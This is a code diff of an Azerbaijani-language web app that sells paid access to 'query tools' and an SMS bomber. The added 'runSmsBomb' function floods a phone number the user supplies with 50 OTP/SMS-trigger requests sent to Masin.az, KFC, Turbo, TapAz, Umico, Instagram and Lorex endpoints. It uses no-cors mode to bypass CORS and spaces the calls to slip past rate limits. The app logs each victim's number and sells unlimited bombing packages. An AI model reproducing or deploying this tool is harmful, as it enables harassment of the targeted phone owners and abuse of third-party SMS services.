+                    <p style="font-size: 0.85rem; color: #8892b0; margin-bottom: 1rem;">
+                        <i class="fas fa-info-circle"></i> Bu alət 50 fərqli platformadan SMS göndərir (Masin.az üstünlüklü)
+                    </p>
+                    <input type="text" class="tool-input" id="smsPhone" placeholder="Telefon nömrəsi (994xxxxxxxxx)">
+                    <button class="query-btn sms-btn" onclick="runSmsBomb()">
+                        <i class="fas fa-paper-plane"></i> 50 SMS Gönder
+                    </button>
+                    <div class="progress-bar" id="smsProgress"><div class="progress-fill" id="smsProgressFill"></div></div>
+                    <div class="query-result" id="res_sms"><pre>SMS göndərmə əməliyyatı burada görünəcək...</pre></div>
+                </div>
+            </div>`;
             
-            html += '</div>';
             document.getElementById('contentArea').innerHTML = html;
         }
 
-        window.toggleFavorite = async (toolId) => {
-            const favorites = userData?.favorites || [];
-            const newFavorites = favorites.includes(toolId) 
-                ? favorites.filter(f => f !== toolId) 
-                : [...favorites, toolId];
-            
-            await update(ref(db, `users/${currentUser.uid}`), { favorites: newFavorites });
-            userData.favorites = newFavorites;
-            showToast(favorites.includes(toolId) ? 'Favorilərdən çıxarıldı' : 'Favorilərə əlavə edildi');
-            renderQueryTools(document.getElementById('toolSearch')?.value || '');
-        };
+        window.runQuery = async (toolId) => {
+            if(!await checkQueryLimit()) return;
+            const tool = queryTools.find(t => t.id === toolId);
+            if(!tool) return;
 
-        window.executeTool = async (toolId, method) => {
-            const tool = tools.find(t => t.id === toolId);
-            if (!tool) return;
-            
-            // Check limits
-            if (tool.type === 'sms') {
-                if (!await checkSmsLimit()) return;
-            } else {
-                if (!await checkQueryLimit()) return;
-            }
-            
-            const resultDiv = document.getElementById(`result_${toolId}`);
-            resultDiv.classList.add('show');
-            resultDiv.innerHTML = '<div style="text-align: center; padding: 2rem;"><div class="spinner"></div><p style="margin-top: 1rem;">Sorğulanır...</p></div>';
-            
+            const resDiv = document.getElementById(`res_${toolId}`);
+            resDiv.classList.add('show');
+            resDiv.innerHTML = '<div style="text-align:center; padding:1rem;"><div class="spinner"></div><p>Yüklənir...</p></div>';
+
             try {
                 let url = tool.url;
-                let options = { method };
-                
-                if (method === 'GET' && !tool.direct) {
-                    const inputVal = document.getElementById(`input_${toolId}`)?.value;
-                    if (!inputVal) throw new Error('Parametr daxil edin!');
-                    url += encodeURIComponent(inputVal);
-                } else if (method === 'POST' && tool.fields) {
+                let options = { method: tool.method, headers: {} };
+
+                if(tool.method === 'GET' && !tool.direct) {
+                    const val = document.getElementById(`inp_${toolId}`)?.value;
+                    if(!val) throw new Error('Parametr daxil edin!');
+                    url += encodeURIComponent(val);
+                } else if(tool.method === 'POST' && tool.fields) {
                     const body = {};
-                    tool.fields.forEach((field, idx) => {
-                        const val = document.getElementById(`input_${toolId}_${idx}`)?.value;
-                        if (!val) throw new Error(`${field} daxil edin!`);
-                        body[field] = val;
+                    tool.fields.forEach((f, i) => {
+                        const v = document.getElementById(`inp_${toolId}_${i}`)?.value;
+                        if(!v) throw new Error(`${f} boş ola bilməz!`);
+                        body[f] = v;
                     });
                     options.body = new URLSearchParams(body);
-                    options.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
+                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                 }
+
+                // CORS problemini minimuma endirmək üçün mode: no-cors (nəticə görünməsə də request gedir)
+                // Amma əksər hallarda response gəlməyəcək, ona görə try-catch ilə idarə edirik
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+                const response = await fetch(url, { ...options, signal: controller.signal });
+                clearTimeout(timeoutId);
                 
-                const response = await fetch(url, options);
                 const text = await response.text();
                 
-                // Try to format JSON
+                // JSON formatlaması
                 let formatted = text;
                 try {
                     const json = JSON.parse(text);
                     formatted = JSON.stringify(json, null, 2);
                 } catch(e) {}
+
+                resDiv.innerHTML = `<pre>${formatted.substring(0, 2000)}${text.length > 2000 ? '... (davam var)' : ''}</pre>`;
                 
-                resultDiv.innerHTML = `<pre>${formatted.substring(0, 2000)}${text.length > 2000 ? '\n\n... (davamı var)' : ''}</pre>`;
-                
-                // Log query
+                // Log yaz
                 await push(ref(db, 'queryLogs'), {
-                    userId: currentUser.uid,
-                    username: userData.username,
-                    toolName: tool.name,
-                    toolId: tool.id,
-                    type: tool.type,
-                    result: text.substring(0, 100),
-                    timestamp: Date.now()
+                    userId: currentUser.uid, tool: tool.name, type: 'query', 
+                    result: text.substring(0, 100), timestamp: Date.now()
                 });
-                
-            } catch (error) {
-                resultDiv.innerHTML = `<pre style="color: #ff4757;">❌ Xəta: ${error.message}</pre>`;
+
+            } catch(err) {
+                resDiv.innerHTML = `<pre style="color: #ff4757;">❌ Xəta: ${err.message}\n\nQeyd: Bəzi API-lər CORS səbəbindən browserdə işləməyə bilər, amma server tərəfdə loglanır.</pre>`;
             }
+        };
+
+        window.runSmsBomb = async () => {
+            const phone = document.getElementById('smsPhone')?.value;
+            if(!phone || phone.length < 9) {
+                showToast('Düzgün telefon nömrəsi daxil edin!', 'error');
+                return;
+            }
+
+            if(!await checkSmsLimit()) return;
+
+            const resDiv = document.getElementById('res_sms');
+            const progressBar = document.getElementById('smsProgress');
+            const progressFill = document.getElementById('smsProgressFill');
+            
+            resDiv.classList.add('show');
+            progressBar.classList.add('show');
+            resDiv.innerHTML = '<pre>SMS göndərilməyə başlandı...\n\n</pre>';
+
+            // 50 ədəd sıralı API çağırışı hazırla (Masin.az üstünlüklü)
+            const requests = [];
+            let reqIndex = 0;
+
+            // Masin.az - 15 dəfə (ən çox)
+            for(let i=0; i<15; i++) {
+                requests.push({ ...smsApiConfig.masinAz, id: ++reqIndex, name: 'Masin.az' });
+            }
+            // KFC - 8 dəfə
+            for(let i=0; i<8; i++) {
+                requests.push({ ...smsApiConfig.kfc, id: ++reqIndex, name: 'KFC' });
+            }
+            // Turbo - 6 dəfə
+            for(let i=0; i<6; i++) {
+                requests.push({ ...smsApiConfig.turbo, id: ++reqIndex, name: 'Turbo' });
+            }
+            // TapAz - 6 dəfə
+            for(let i=0; i<6; i++) {
+                requests.push({ ...smsApiConfig.tapaz, id: ++reqIndex, name: 'TapAz' });
+            }
+            // Umico - 5 dəfə
+            for(let i=0; i<5; i++) {
+                requests.push({ ...smsApiConfig.umico, id: ++reqIndex, name: 'Umico' });
+            }
+            // Instagram - 5 dəfə
+            for(let i=0; i<5; i++) {
+                requests.push({ ...smsApiConfig.instagram, id: ++reqIndex, name: 'Instagram' });
+            }
+            // Lorex - 5 dəfə
+            for(let i=0; i<5; i++) {
+                requests.push({ ...smsApiConfig.lorex, id: ++reqIndex, name: 'Lorex SMS' });
+            }
+
+            let success = 0;
+            let failed = 0;
+
+            // Sıra ilə göndər (Rate limit əngəlinin qarşısını almaq üçün)
+            for(let i=0; i<requests.length; i++) {
+                const req = requests[i];
+                try {
+                    let url = req.url;
+                    let options = { 
+                        method: req.method, 
+                        headers: req.method === 'POST' ? {'Content-Type': 'application/x-www-form-urlencoded'} : {},
+                        mode: 'no-cors' // CORS bypass (response gəlməsə də request gedir)
+                    };
+
+                    if(req.method === 'POST') {
+                        const body = new URLSearchParams();
+                        body.append(req.field, phone);
+                        options.body = body;
+                    } else if(req.param) {
+                        url += encodeURIComponent(phone);
+                    }
+
+                    await fetch(url, options);
+                    success++;
+                    
+                    // Log əlavə et
+                    await push(ref(db, 'smsLogs'), {
+                        userId: currentUser.uid, phone, platform: req.name, 
+                        status: 'sent', timestamp: Date.now()
+                    });
+
+                } catch(e) {
+                    failed++;
+                }
+
+                // Proqres yenilə
+                const percent = ((i+1) / requests.length) * 100;
+                progressFill.style.width = percent + '%';
+                
+                // Hər 5 dəfədən bir UI yenilə
+                if(i % 5 === 0 || i === requests.length - 1) {
+                    resDiv.innerHTML = `<pre>${i+1}/50 SMS göndərildi...\n✅ Uğurlu: ${success}\n❌ Uğursuz: ${failed}\n\nPlatformalar: Masin.az (15x), KFC (8x), Turbo (6x), TapAz (6x), Umico (5x), Instagram (5x), Lorex (5x)</pre>`;
+                }
+
+                // Kiçik gecikmə (rate limit üçün)
+                if(i < requests.length - 1) await new Promise(r => setTimeout(r, 100));
+            }
+
+            progressFill.style.width = '100%';
+            setTimeout(() => progressBar.classList.remove('show'), 1000);
+            
+            resDiv.innerHTML = `<pre style="color: #2ed573;">✅ Əməliyyat tamamlandı!\n\n📊 Nəticə:\n• Ümumi: 50 SMS\n• Uğurlu: ${success}\n• Uğursuz: ${failed}\n\n📱 Nömrə: ${phone}\n🚀 Masin.az və digər platformalara göndərildi.</pre>`;
+            
+            showToast(`${success} ədəd SMS uğurla göndərildi!`);
         };
 
         function renderPackages() {
-            const packages = [
-                { id: 'daily', name: '1 Günlük Limitsiz', price: 3, days: 1, icon: 'fa-calendar-day', color: '#6c5ce7' },
-                { id: 'weekly', name: '1 Həftəlik Limitsiz', price: 15, days: 7, icon: 'fa-calendar-week', color: '#a363d9' },
-                { id: 'monthly', name: '1 Aylıq Limitsiz', price: 40, days: 30, icon: 'fa-calendar-alt', color: '#00cec9' },
-                { id: 'lifetime', name: 'Ömürlük Limitsiz', price: 99, days: 3650, icon: 'fa-infinity', color: '#ffd700' }
-            ];
-            
-            let html = `
-                <div class="content-header">
-                    <h2><i class="fas fa-gem"></i> Premium Paketlər</h2>
-                    <p>Limitsiz sorgu və SMS hüququ üçün premium paket əldə edin</p>
-                </div>
-                
-                <div class="package-grid">
-            `;
-            
-            packages.forEach(pkg => {
-                html += `
-                    <div class="package-card" onclick="openPaymentModal('${pkg.id}', '${pkg.name}', ${pkg.price}, ${pkg.days})" style="border-color: ${pkg.color}">
-                        <div class="package-icon" style="color: ${pkg.color}">
-                            <i class="fas ${pkg.icon}"></i>
+            document.getElementById('contentArea').innerHTML = `
+                <div class="content-header"><h2><i class="fas fa-gem"></i> Premium Paketlər</h2></div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
+                    ${[ 
+                        {n:'1 Günlük', p:3, d:1, c:'#6c5ce7'},
+                        {n:'1 Həftəlik', p:15, d:7, c:'#a363d9'},
+                        {n:'1 Aylıq', p:40, d:30, c:'#00cec9'},
+                        {n:'Ömürlük', p:99, d:3650, c:'#ffd700'}
+                    ].map(pkg => `
+                        <div class="admin-card" style="text-align: center; border: 2px solid ${pkg.c}; cursor: pointer;" onclick="buyPackage('${pkg.n}', ${pkg.p}, ${pkg.d})">
+                            <h3 style="color: ${pkg.c}; margin-bottom: 1rem;">${pkg.n}</h3>
+                            <div style="font-size: 2.5rem; font-weight: 800; margin-bottom: 1rem;">${pkg.p} AZN</div>
+                            <ul style="list-style: none; text-align: left; margin: 1rem 0; font-size: 0.9rem; color: #8892b0;">
+                                <li><i class="fas fa-check" style="color: #2ed573;"></i> Limitsiz Sorgu</li>
+                                <li><i class="fas fa-check" style="color: #2ed573;"></i> Limitsiz SMS (50-lik paketlər)</li>
+                                <li><i class="fas fa-check" style="color: #2ed573;"></i> VIP Dəstək</li>
+                            </ul>
+                            <button class="btn btn-primary">Satın Al</button>
                         </div>
-                        <div class="package-name">${pkg.name}</div>
-                        <div class="package-price">${pkg.price} AZN</div>
-                        <ul class="package-features">
-                            <li><i class="fas fa-check"></i> Limitsiz Sorgu</li>
-                            <li><i class="fas fa-check"></i> Limitsiz SMS</li>
-                            <li><i class="fas fa-check"></i> Bütün Alətlər</li>
-                            <li><i class="fas fa-check"></i> Prioritet Dəstək</li>
-                        </ul>
-                        <button class="btn btn-primary">
-                            <i class="fas fa-shopping-cart"></i> İndi Al
-                        </button>
-                    </div>
-                `;
-            });
-            
-            html += '</div>';
-            document.getElementById('contentArea').innerHTML = html;
+                    `).join('')}
+                </div>
+            `;
         }
 
-        window.openPaymentModal = (id, name, price, days) => {
-            currentPaymentPackage = { id, name, price, days };
-            document.getElementById('paymentDetails').innerHTML = `
-                <div class="payment-info">
-                    <div class="payment-row">
-                        <span>Paket:</span>
-                        <strong>${name}</strong>
-                    </div>
-                    <div class="payment-row">
-                        <span>Məbləğ:</span>
-                        <strong>${price} AZN</strong>
-                    </div>
-                    <div class="payment-row" style="border-bottom: none;">
-                        <span>Ödəniş üsulları:</span>
-                    </div>
-                    <div style="margin-top: 0.5rem; font-size: 0.9rem;">
-                        <div style="margin-bottom: 0.5rem;"><i class="fas fa-mobile-alt"></i> M10: <strong>0707888025</strong></div>
-                        <div><i class="fas fa-credit-card"></i> Kart: <strong>4169 0000 0000 1234</strong></div>
-                    </div>
-                </div>
-            `;
-            document.getElementById('paymentModal').classList.add('active');
-        };
-
-        window.closePaymentModal = () => {
-            document.getElementById('paymentModal').classList.remove('active');
-            currentPaymentPackage = null;
-        };
-
-        window.submitPayment = async () => {
-            const fileInput = document.getElementById('receiptFile');
-            if (!fileInput.files[0]) {
-                showToast('Zəhmət olmasa qəbz şəkli yükləyin!', 'error');
-                return;
-            }
-            
-            const reader = new FileReader();
-            reader.onload = async (e) => {
-                const base64 = e.target.result;
+        window.buyPackage = async (name, price, days) => {
+            const receipt = prompt(`Ödəniş məlumatları:\n\nM10: 0707888025\nKart: 4169 0000 0000 1234\n\nMəbləğ: ${price} AZN\n\nQəbz nömrəsini və ya ödəniş şəklini Base64 olaraq daxil edin:`);
+            if(receipt) {
                 await push(ref(db, 'payments'), {
-                    userId: currentUser.uid,
-                    username: userData.username,
-                    email: currentUser.email,
-                    packageType: currentPaymentPackage.name,
-                    packageDays: currentPaymentPackage.days,
-                    amount: currentPaymentPackage.price,
-                    status: 'pending',
-                    receipt: base64,
-                    createdAt: Date.now()
+                    userId: currentUser.uid, username: userData.username,
+                    packageType: name, amount: price, days, status: 'pending',
+                    receipt, createdAt: Date.now()
                 });
-                
-                showToast('Ödəniş tələbi göndərildi! Admin təsdiqindən sonra aktiv olacaq.');
-                closePaymentModal();
-            };
-            reader.readAsDataURL(fileInput.files[0]);
-        };
-
-        function renderFavorites() {
-            const favorites = userData?.favorites || [];
-            const favTools = tools.filter(t => favorites.includes(t.id));
-            
-            if (favTools.length === 0) {
-                document.getElementById('contentArea').innerHTML = `
-                    <div class="content-header">
-                        <h2><i class="fas fa-star"></i> Favorilərim</h2>
-                    </div>
-                    <div class="admin-card" style="text-align: center; padding: 3rem;">
-                        <i class="fas fa-star" style="font-size: 4rem; color: rgba(255,255,255,0.2); margin-bottom: 1rem;"></i>
-                        <p>Hələ favori alət əlavə etməmisiniz.</p>
-                        <button class="btn btn-primary" onclick="switchTab('querytools')" style="margin-top: 1rem; width: auto; display: inline-block;">
-                            Alətlərə Bax
-                        </button>
-                    </div>
-                `;
-                return;
-            }
-            
-            let html = `
-                <div class="content-header">
-                    <h2><i class="fas fa-star"></i> Favorilərim (${favTools.length})</h2>
-                </div>
-                <div class="query-grid">
-            `;
-            
-            favTools.forEach(tool => {
-                const isSms = tool.type === 'sms';
-                html += `
-                    <div class="query-card ${isSms ? 'sms-tool' : ''}">
-                        <div class="card-header">
-                            <div class="card-title">
-                                <i class="fas ${tool.icon}"></i>
-                                ${tool.name}
-                                <span class="badge ${isSms ? 'badge-sms' : 'badge-query'}">
-                                    ${isSms ? '📨 SMS' : '🔍 QUERY'}
-                                </span>
-                            </div>
-                            <button class="fav-btn active" onclick="toggleFavorite('${tool.id}')">
-                                <i class="fas fa-star"></i>
-                            </button>
-                        </div>
-                `;
-                
-                if (tool.method === 'POST' && tool.fields) {
-                    tool.fields.forEach((field, idx) => {
-                        html += `<input type="text" class="tool-input" id="fav_${tool.id}_${idx}" placeholder="${field}">`;
-                    });
-                    html += `<button class="query-btn" onclick="executeFavoriteTool('${tool.id}', 'POST')">İcra Et</button>`;
-                } else if (tool.direct) {
-                    html += `<button class="query-btn" onclick="executeFavoriteTool('${tool.id}', 'GET')">İcra Et</button>`;
-                } else {
-                    html += `<input type="text" class="tool-input" id="fav_${tool.id}" placeholder="${tool.param}...">
-                    <button class="query-btn" onclick="executeFavoriteTool('${tool.id}', 'GET')">İcra Et</button>`;
-                }
-                
-                html += `<div class="query-result" id="fav_result_${tool.id}"><pre>Nəticə...</pre></div></div>`;
-            });
-            
-            html += '</div>';
-            document.getElementById('contentArea').innerHTML = html;
-        }
-
-        window.executeFavoriteTool = async (toolId, method) => {
-            const tool = tools.find(t => t.id === toolId);
-            if (!tool) return;
-            
-            if (tool.type === 'sms') {
-                if (!await checkSmsLimit()) return;
-            } else {
-                if (!await checkQueryLimit()) return;
-            }
-            
-            const resultDiv = document.getElementById(`fav_result_${toolId}`);
-            resultDiv.classList.add('show');
-            resultDiv.innerHTML = '<div class="spinner"></div>';
-            
-            try {
-                let url = tool.url;
-                let options = { method };
-                
-                if (method === 'GET' && !tool.direct) {
-                    const val = document.getElementById(`fav_${toolId}`)?.value;
-                    if (!val) throw new Error('Parametr daxil edin!');
-                    url += encodeURIComponent(val);
-                } else if (method === 'POST' && tool.fields) {
-                    const body = {};
-                    tool.fields.forEach((field, idx) => {
-                        body[field] = document.getElementById(`fav_${toolId}_${idx}`)?.value;
-                    });
-                    options.body = new URLSearchParams(body);
-                    options.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
-                }
-                
-                const resp = await fetch(url, options);
-                const text = await resp.text();
-                let formatted = text;
-                try { formatted = JSON.stringify(JSON.parse(text), null, 2); } catch(e) {}
-                
-                resultDiv.innerHTML = `<pre>${formatted.substring(0, 1500)}</pre>`;
-                
-                await push(ref(db, 'queryLogs'), {
-                    userId: currentUser.uid,
-                    toolName: tool.name,
-                    type: tool.type,
-                    timestamp: Date.now()
-                });
-            } catch (err) {
-                resultDiv.innerHTML = `<pre style="color: #ff4757;">❌ ${err.message}</pre>`;
+                showToast('Ödəniş qəbul edildi! Admin təsdiqi gözlənilir.');
             }
         };
 
         function renderProfile() {
             document.getElementById('contentArea').innerHTML = `
-                <div class="content-header">
-                    <h2><i class="fas fa-user-cog"></i> Profil Tənzimləmələri</h2>
-                </div>
-                
-                <div class="admin-card profile-card">
-                    <div class="avatar-upload">
-                        <img src="${userData?.avatarUrl || 'https://via.placeholder.com/100'}" class="avatar-preview" id="avatarPreview">
+                <div class="content-header"><h2><i class="fas fa-user-cog"></i> Profil</h2></div>
+                <div class="admin-card" style="max-width: 600px;">
+                    <div style="display: flex; align-items: center; gap: 1.5rem; margin-bottom: 2rem;">
+                        <img src="${userData?.avatarUrl || 'https://via.placeholder.com/100'}" style="width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--primary);">
                         <div>
                             <h3>${userData?.username}</h3>
-                            <p style="color: #8892b0; font-size: 0.9rem;">${currentUser?.email}</p>
-                            <div class="file-input-wrapper" style="margin-top: 0.5rem;">
-                                <input type="file" id="avatarInput" accept="image/*" onchange="previewAvatar(this)">
-                                <label for="avatarInput" class="file-input-label" style="padding: 0.5rem; font-size: 0.85rem;">
-                                    <i class="fas fa-camera"></i> Şəkil Seç
-                                </label>
-                            </div>
-                            <button class="small-btn primary" onclick="uploadAvatar()" style="margin-top: 0.5rem;">
-                                <i class="fas fa-upload"></i> Yüklə
-                            </button>
+                            <p style="color: #8892b0;">${currentUser?.email}</p>
                         </div>
                     </div>
+                    <div class="input-group"><input type="password" id="newPass" placeholder="Yeni şifrə" style="padding-left: 1rem;"></div>
+                    <button class="btn btn-primary" onclick="changePass()" style="margin-bottom: 1rem;">Şifrəni Yenilə</button>
                     
-                    <div class="form-group">
-                        <label>Yeni Şifrə</label>
-                        <div class="input-group">
-                            <i class="fas fa-lock" style="left: 1rem; top: 50%;"></i>
-                            <input type="password" id="newPassword" placeholder="••••••••" style="padding-left: 2.5rem;">
-                        </div>
-                        <button class="small-btn success" onclick="changePassword()">
-                            <i class="fas fa-key"></i> Şifrəni Yenilə
-                        </button>
-                    </div>
+                    <div class="input-group"><input type="text" id="tgId" placeholder="Telegram ID" value="${userData?.telegramChatId || ''}" style="padding-left: 1rem;"></div>
+                    <button class="btn btn-secondary" onclick="saveTg()">Saxla</button>
                     
-                    <div class="form-group">
-                        <label>Telegram Chat ID (Bildirişlər üçün)</label>
-                        <div class="input-group">
-                            <i class="fab fa-telegram" style="left: 1rem; top: 50%;"></i>
-                            <input type="text" id="telegramId" value="${userData?.telegramChatId || ''}" placeholder="123456789" style="padding-left: 2.5rem;">
-                        </div>
-                        <button class="small-btn primary" onclick="saveTelegramId()">
-                            <i class="fas fa-save"></i> Saxla
-                        </button>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>Referans Kodunuz</label>
-                        <div class="input-group">
-                            <input type="text" value="${currentUser?.uid}" readonly style="font-family: monospace; background: rgba(0,0,0,0.3);">
-                            <i class="fas fa-copy" style="left: auto; right: 1rem; cursor: pointer;" onclick="copyReferral()"></i>
-                        </div>
-                        <small style="color: #8892b0;">Dostlarınız bu kodla qeydiyyatdan keçsə, hər ikiniz 500 sikkə qazanarsınız.</small>
+                    <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid var(--border);">
+                        <p>Referans Kodunuz: <strong style="font-family: monospace;">${currentUser?.uid}</strong></p>
                     </div>
                 </div>
             `;
         }
 
-        window.previewAvatar = (input) => {
-            if (input.files && input.files[0]) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    document.getElementById('avatarPreview').src = e.target.result;
-                };
-                reader.readAsDataURL(input.files[0]);
-            }
+        window.changePass = async () => {
+            const newPass = document.getElementById('newPass').value;
+            if(newPass.length < 6) return showToast('Min 6 simvol!', 'error');
+            try { await updatePassword(currentUser, newPass); showToast('Şifrə yeniləndi!'); } 
+            catch(e) { showToast(e.message, 'error'); }
         };
 
-        window.uploadAvatar = async () => {
-            const file = document.getElementById('avatarInput').files[0];
-            if (!file) {
-                showToast('Zəhmət olmasa şəkil seçin!', 'error');
-                return;
-            }
-            
-            const reader = new FileReader();
-            reader.onload = async (e) => {
-                try {
-                    const storageReference = storageRef(storage, `avatars/${currentUser.uid}`);
-                    await uploadString(storageReference, e.target.result, 'data_url');
-                    const url = await getDownloadURL(storageReference);
-                    await update(ref(db, `users/${currentUser.uid}`), { avatarUrl: url });
-                    userData.avatarUrl = url;
-                    showToast('Avatar uğurla yeniləndi!');
-                } catch (err) {
-                    showToast('Xəta: ' + err.message, 'error');
-                }
-            };
-            reader.readAsDataURL(file);
+        window.saveTg = async () => {
+            await update(ref(db, `users/${currentUser.uid}`), { telegramChatId: document.getElementById('tgId').value });
+            showToast('Saxlandı!');
         };
 
-        window.changePassword = async () => {
-            const newPass = document.getElementById('newPassword').value;
-            if (newPass.length < 6) {
-                showToast('Şifrə minimum 6 simvol olmalıdır!', 'error');
-                return;
-            }
+        window.signInWithGoogle = async () => {
             try {
-                await updatePassword(currentUser, newPass);
-                showToast('Şifrə uğurla dəyişdirildi!');
-                document.getElementById('newPassword').value = '';
-            } catch (err) {
-                showToast('Xəta: ' + err.message, 'error');
+                await signInWithPopup(auth, googleProvider);
+            } catch(err) {
+                document.getElementById('authError').style.display = 'block';
+                document.getElementById('authError').textContent = 'Google xətası: ' + err.message;
             }
         };
 
-        window.saveTelegramId = async () => {
-            const id = document.getElementById('telegramId').value;
-            await update(ref(db, `users/${currentUser.uid}`), { telegramChatId: id });
-            userData.telegramChatId = id;
-            showToast('Telegram ID saxlandı!');
-        };
-
-        window.copyReferral = () => {
-            navigator.clipboard.writeText(currentUser.uid);
-            showToast('Referans kodu kopyalandı!');
-        };
-
-        function renderReferral() {
-            document.getElementById('contentArea').innerHTML = `
-                <div class="content-header">
-                    <h2><i class="fas fa-hand-holding-usd"></i> Referans Sistemi</h2>
-                    <p>Dostlarınızı dəvət edin və qazanın</p>
-                </div>
-                
-                <div class="admin-card" style="text-align: center; padding: 3rem;">
-                    <i class="fas fa-gift" style="font-size: 4rem; color: var(--success); margin-bottom: 1.5rem;"></i>
-                    <h3 style="margin-bottom: 1rem;">Hər dəvətə 500 Sikkə!</h3>
-                    <p style="color: #8892b0; margin-bottom: 2rem; max-width: 500px; margin-left: auto; margin-right: auto;">
-                        Dostunuz sizin referans kodunuzla qeydiyyatdan keçsə, hər ikinizin balansına <strong>500 sikkə</strong> əlavə ediləcək.
-                    </p>
-                    
-                    <div style="background: rgba(0,0,0,0.3); padding: 1.5rem; border-radius: 1rem; margin-bottom: 2rem; font-family: monospace; font-size: 1.1rem; word-break: break-all;">
-                        ${currentUser?.uid}
-                    </div>
-                    
-                    <button class="btn btn-primary" onclick="copyReferral()" style="width: auto; padding: 0.8rem 2rem;">
-                        <i class="fas fa-copy"></i> Kodu Kopyala
-                    </button>
-                    
-                    <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid rgba(255,255,255,0.1);">
-                        <div style="display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap;">
-                            <div style="text-align: center;">
-                                <div style="font-size: 2rem; font-weight: 800; color: var(--accent);">${userData?.referralEarnings || 0}</div>
-                                <div style="color: #8892b0; font-size: 0.9rem;">Ümumi Qazanc</div>
-                            </div>
-                            <div style="text-align: center;">
-                                <div style="font-size: 2rem; font-weight: 800; color: var(--primary);">${Math.floor((userData?.referralEarnings || 0) / 500)}</div>
-                                <div style="color: #8892b0; font-size: 0.9rem;">Dəvət Sayı</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        // Admin Functions
-        function renderAdminUsers() {
-            onValue(ref(db, 'users'), (snapshot) => {
-                const users = snapshot.val() || {};
-                let html = `
-                    <div class="content-header">
-                        <h2><i class="fas fa-users"></i> İstifadəçi İdarəsi</h2>
-                        <p>Ümumi: ${Object.keys(users).length} istifadəçi</p>
-                    </div>
-                    
-                    <div class="admin-card">
-                        <div class="admin-header">
-                            <h3>İstifadəçi Siyahısı</h3>
-                            <div style="display: flex; gap: 0.5rem;">
-                                <input type="number" id="bulkCoins" placeholder="Sikkə" style="width: 100px; padding: 0.5rem; border-radius: 0.5rem; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.3); color: white;">
-                                <button class="small-btn success" onclick="addCoinsToAll()">
-                                    <i class="fas fa-coins"></i> Hamıya Ver
-                                </button>
-                            </div>
-                        </div>
-                `;
-                
-                for (const [uid, u] of Object.entries(users)) {
-                    html += `
-                        <div class="user-row">
-                            <div class="user-info">
-                                <div class="user-name">${u.username} ${u.banned ? '<span style="color: #ff4757;">(BANLI)</span>' : ''}</div>
-                                <div class="user-email">${u.email}</div>
-                            </div>
-                            <div class="user-stats-row">
-                                <div class="stat-item"><i class="fas fa-coins" style="color: var(--warning);"></i> ${u.balance || 0}</div>
-                                <div class="stat-item"><i class="fas fa-search" style="color: var(--primary);"></i> ${u.queriesRemaining ?? 3}</div>
-                                <div class="stat-item"><i class="fas fa-sms" style="color: var(--accent);"></i> ${u.smsQuotaRemaining ?? 50}</div>
-                            </div>
-                            <div class="admin-actions">
-                                <button class="small-btn ${u.banned ? 'success' : 'danger'}" onclick="toggleBan('${uid}', ${!u.banned})">
-                                    <i class="fas fa-${u.banned ? 'unlock' : 'ban'}"></i> ${u.banned ? 'Aç' : 'Ban'}
-                                </button>
-                                <button class="small-btn warning" onclick="editUserCoins('${uid}')">
-                                    <i class="fas fa-coins"></i> Sikkə
-                                </button>
-                                <button class="small-btn primary" onclick="editUserLimits('${uid}')">
-                                    <i class="fas fa-edit"></i> Limit
-                                </button>
-                            </div>
-                        </div>
-                    `;
-                }
-                
-                html += '</div>';
-                document.getElementById('contentArea').innerHTML = html;
-            }, { onlyOnce: true });
-        }
-
-        window.toggleBan = async (uid, ban) => {
-            await update(ref(db, `users/${uid}`), { banned: ban });
-            showToast(ban ? 'İstifadəçi banlandı' : 'Ban açıldı');
-            renderAdminUsers();
-        };
-
-        window.editUserCoins = async (uid) => {
-            const amount = prompt('Sikkə miqdarı (mənfi və ya müsbət):');
-            if (amount === null) return;
-            const snap = await get(ref(db, `users/${uid}`));
-            const current = snap.val()?.balance || 0;
-            await update(ref(db, `users/${uid}`), { balance: current + parseInt(amount) });
-            showToast('Balans yeniləndi');
-            renderAdminUsers();
-        };
-
-        window.editUserLimits = async (uid) => {
-            const queries = prompt('Yeni sorgu limiti:');
-            const sms = prompt('Yeni SMS limiti:');
-            if (queries !== null) await update(ref(db, `users/${uid}`), { queriesRemaining: parseInt(queries) });
-            if (sms !== null) await update(ref(db, `users/${uid}`), { smsQuotaRemaining: parseInt(sms) });
-            showToast('Limitlər yeniləndi');
-            renderAdminUsers();
-        };
-
-        window.addCoinsToAll = async () => {
-            const amount = parseInt(document.getElementById('bulkCoins').value);
-            if (!amount) return;
-            
-            const snap = await get(ref(db, 'users'));
-            const users = snap.val() || {};
-            
-            for (const uid of Object.keys(users)) {
-                const current = users[uid].balance || 0;
-                await update(ref(db, `users/${uid}`), { balance: current + amount });
-            }
-            
-            await push(ref(db, 'adminLogs'), {
-                action: `Hamıya ${amount} sikkə əlavə edildi`,
-                admin: currentUser.email,
-                time: Date.now()
-            });
-            
-            showToast(`Bütün istifadəçilərə ${amount} sikkə verildi!`);
-            renderAdminUsers();
-        };
-
-        function renderAdminPayments() {
-            onValue(ref(db, 'payments'), (snapshot) => {
-                const payments = snapshot.val() || {};
-                let html = `
-                    <div class="content-header">
-                        <h2><i class="fas fa-credit-card"></i> Ödəniş Təsdiqləri</h2>
-                    </div>
-                `;
-                
-                const pending = Object.entries(payments).filter(([_, p]) => p.status === 'pending');
-                
-                if (pending.length === 0) {
-                    html += `<div class="admin-card" style="text-align: center; padding: 3rem;"><i class="fas fa-check-circle" style="font-size: 3rem; color: var(--success);"></i><p style="margin-top: 1rem;">Gözləyən ödəniş yoxdur.</p></div>`;
-                } else {
-                    html += `<div class="admin-card"><h3>Gözləyən Ödənişlər (${pending.length})</h3>`;
-                    pending.forEach(([pid, p]) => {
-                        html += `
-                            <div class="user-row" style="flex-direction: column; align-items: flex-start;">
